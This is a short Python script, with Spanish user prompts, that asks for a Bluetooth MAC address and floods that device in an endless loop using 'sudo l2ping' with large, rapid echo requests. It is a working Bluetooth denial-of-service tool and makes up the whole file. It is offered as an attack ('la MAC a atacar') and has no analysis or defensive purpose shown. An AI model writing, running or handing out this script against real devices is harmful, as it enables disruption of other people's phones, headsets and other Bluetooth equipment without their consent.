import subprocess

if __name__ == "__main__":
    target_mac = input("Introduce la MAC a atacar: ")
    try:
        while True:
            subprocess.run(['sudo', 'l2ping', '-i', 'hci0', '-s', '600', '-f', target_mac]) 
    except KeyboardInterrupt:
        print("Ataque interrumpido por el usuario.")
